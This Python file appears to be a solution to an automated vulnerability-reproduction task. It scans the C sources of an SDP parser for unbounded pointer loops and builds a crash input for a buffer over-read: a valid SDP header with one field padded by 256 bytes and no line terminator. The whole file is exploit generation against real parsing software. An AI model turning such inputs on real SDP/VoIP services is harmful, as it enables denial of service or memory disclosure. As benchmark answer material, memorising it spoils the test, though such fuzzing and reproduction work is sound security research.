import tarfile
import os
import re
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = tempfile.mkdtemp()
        try:
            # Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(extract_dir)
            
            target_files = []
            for root, dirs, files in os.walk(extract_dir):
                # Look for source files in parser/sdp directory
                if 'sdp' in root.split(os.sep): 
                    for f in files:
                        if f.endswith('.c'):
                            target_files.append(os.path.join(root, f))
            
            # Default target field is 'a' (attribute) as it's a common vector
            target_field = 'a' 
            
            # Heuristic Analysis to identify the vulnerable parsing function
            for fpath in target_files:
                with open(fpath, 'r', errors='ignore') as f:
                    lines = f.readlines()
                
                current_func = None
                for line in lines:
                    # Detect function definitions
                    m_func = re.match(r'^[\w\s\*]+\s+(\w+)\s*\(', line)
                    if m_func:
                        current_func = m_func.group(1)
                    
                    # Heuristic: Look for loops advancing pointers without checking boundaries (end/len)
                    # Pattern: while (*p != 'X' ...)
                    if 'while' in line and '*' in line and ('!=' in line or '==' in line):
                        # If the loop condition does not check against 'end', 'len', 'limit', 'max', '<'
                        # it is likely the unchecked access point.
                        if not any(safe in line for safe in ['end', 'len', 'limit', 'max', '<']):
                            if current_func:
                                if 'parse_o' in current_func or 'origin' in current_func:
                                    target_field = 'o'
                                elif 'parse_m' in current_func or 'media' in current_func:
                                    target_field = 'm'
                                elif 'parse_c' in current_func or 'connection' in current_func:
                                    target_field = 'c'
                                elif 'extract_mediaip' in current_func:
                                    target_field = 'c' # extract_mediaip is often used for c= lines
                                elif 'parse_a' in current_func or 'attr' in current_func:
                                    target_field = 'a'

            # Construct PoC
            # We create a valid SDP structure leading up to the target field,
            # then append a malformed value that continues until EOF (no delimiter).
            # Padding length is chosen to be sufficient to trigger ASAN redzone or page fault,
            # but kept reasonably short to maximize score.
            padding = b"A" * 256
            
            poc = b"v=0\r\n"
            
            if target_field == 'o':
                # o=<username> <sess-id> <sess-version> <nettype> <addrtype> <unicast-address>
                poc += b"o=user1 1234 1 IN IP4 " + padding
            elif target_field == 'c':
                poc += b"o=user1 1234 1 IN IP4 127.0.0.1\r\n"
                poc += b"s=Session\r\n"
                poc += b"t=0 0\r\n"
                poc += b"m=audio 1234 RTP/AVP 0\r\n"
                # c=<nettype> <addrtype> <connection-address>
                poc += b"c=IN IP4 " + padding
            elif target_field == 'm':
                poc += b"o=user1 1234 1 IN IP4 127.0.0.1\r\n"
                poc += b"s=Session\r\n"
                poc += b"t=0 0\r\n"
                # m=<media> <port> <proto> <fmt> ...
                poc += b"m=audio " + padding
            else: # 'a' or default
                poc += b"o=user1 1234 1 IN IP4 127.0.0.1\r\n"
                poc += b"s=Session\r\n"
                poc += b"t=0 0\r\n"
                poc += b"m=audio 1234 RTP/AVP 0\r\n"
                poc += b"c=IN IP4 127.0.0.1\r\n"
                # a=<attribute>
                poc += b"a=rtpmap:0 " + padding
                
            return poc
            
        except Exception:
            # Fallback PoC if analysis fails
            return b"v=0\r\no=u 1 1 IN IP4 127.0.0.1\r\ns=s\r\nt=0 0\r\nm=audio 1234 RTP/AVP 0\r\nc=IN IP4 1.2.3.4\r\na=rtpmap:0 " + b"A"*256
        finally:
            if os.path.exists(extract_dir):
                shutil.rmtree(extract_dir)